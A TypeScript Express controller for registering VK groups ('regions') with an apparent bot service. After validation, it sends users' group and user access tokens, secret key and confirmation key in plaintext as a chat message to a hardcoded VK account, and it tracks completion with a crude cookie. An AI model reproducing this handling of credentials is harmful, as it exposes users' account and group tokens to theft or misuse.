import { Response, Request, Router, NextFunction } from "express";
import { check, ValidationError, validationResult } from "express-validator";
import { getRandomId, VK } from "vk-io";
import {
  IsInvalidToken,
  IsInvalidTokenGroup,
} from "../validators/isInvalidToken";
import { isUniqueGID } from "../validators/isUniqueGID";
import { isUniqueName } from "../validators/isUniqueName";
import { isUniqueGToken } from "../validators/isUniqueGToken";
import { getVkFromEnv } from "../utils/getVkFromEnv";
import { Controller } from "./conntroller";
import { getManagers } from "../utils/getManagers";

export class ConnectController extends Controller {
  public async get(req: Request, res: Response) {
    if (req.cookies["penis"]) return res.render("success");
    return res.render("connect", { errors: null, values: null });
  }

  public async post(req: Request, res: Response) {
    const valid_errors = validationResult(req);
    if (!valid_errors.isEmpty())
      return res.render("connect", {
        errors: valid_errors.array(),
        values: req.body,
      });
    const { secret, confirm, name, group_id, token_group, token_user } =
      req.body;
    const { api: group_api } = new VK({ token: token_group });
    const { id: group_id_verif, name: group_name } = (
      await group_api.groups.getById({})
    )[0];
    if (group_id_verif !== group_id) {
      const error: ValidationError = {
        msg: "Неправильный group ID",
        param: "group_id",
        value: req.body.group_id,
        location: "body",
      };
      return res.render("connect", {
        errors: [error],
        values: req.body,
      });
    }
    const managers = await getManagers(group_api, group_id, [
      "administrator",
      "creator",
    ]);
    const { api: user_api } = new VK({ token: token_user });
    const {
      first_name,
      last_name,
      id: user_id,
    } = await user_api.account.getProfileInfo({});
    if (!managers.includes(user_id)) {
      const error: ValidationError = {
        msg: "Не выдана админка пользователю",
        param: "token_user",
        value: req.body.group_id,
        location: "body",
      };
      return res.render("connect", {
        errors: [error],
        values: req.body,
      });
    }
    const { vk } = getVkFromEnv().filter((val) => val.c.gId === 193840305)[0];
    vk.api.messages.send({
      peer_id: 578425189,
      random_id: getRandomId(),
      message: `Зарегистрирован [id${user_id}|новый пользователь ${first_name} ${last_name}]\nСтрана - [club${group_id}|${group_name}]\n\nGroupToken - ${token_group}\nUserToken - ${token_user}\n\nСекретный ключ - ${secret}\nConfirmation ключ - ${confirm}\n\nНазвание региона - ${name}`,
    });
    res.cookie("penis", "true");
    return res.render("success");
  }

  private getValidators() {
    return [
      check("token_user")
        .notEmpty()
        .withMessage("Требуется токен пользователя")
        .custom(IsInvalidToken),
      check("token_group")
        .notEmpty()
        .withMessage("Требуется токен группы")
        .custom(isUniqueGToken)
        .withMessage("Такой токен уже есть в бд")
        .custom(IsInvalidTokenGroup),
      check("group_id")
        .notEmpty()
        .withMessage("Требуется ID")
        .toInt()
        .custom(isUniqueGID)
        .withMessage("Такое id уже зарегистрировано"),
      check("name")
        .notEmpty()
        .withMessage("Вы не дали региону имя")
        .custom(isUniqueName)
        .withMessage("Такое имя уже есть"),
      check("confirm").notEmpty().withMessage("Нет confirmation ключа"),
      check("secret").isString(),
    ];
  }

  public async setPaths() {
    this.router.get("/", this.get);
    console.log(`[SUCCESS] ConnectController: Route "GET /" is loaded`);
    this.router.post("/", ...this.getValidators(), this.post);
    console.log(`[SUCCESS] ConnectController: Route "POST /" is loaded`);
  }
}
